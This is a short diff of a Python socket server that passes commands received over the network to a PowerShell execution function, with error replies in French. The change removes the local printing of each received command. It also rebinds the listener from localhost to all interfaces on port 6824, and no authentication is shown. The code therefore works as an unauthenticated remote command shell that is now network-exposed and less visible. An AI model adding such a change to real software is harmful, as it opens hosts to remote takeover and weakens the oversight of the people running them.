@@ -75,7 +75,6 @@ def srv(server_socket,conn):
                         try:
                             msgl = msg.split(':')
                             cmd = msgl[1]
-                            print(cmd)
                             powershell(conn, cmd)
                         except:
                             conn.send('Commande inconnue ou incorrecte'.encode())
@@ -130,7 +129,7 @@ def powershell(conn,cmd):
 
 def connect():
     server_socket = socket.socket()
-    server_socket.bind(('127.0.0.1', 6824))
+    server_socket.bind(('0.0.0.0', 6824))
     server_socket.listen(1)
     conn, address = server_socket.accept()
     srv(server_socket,conn)
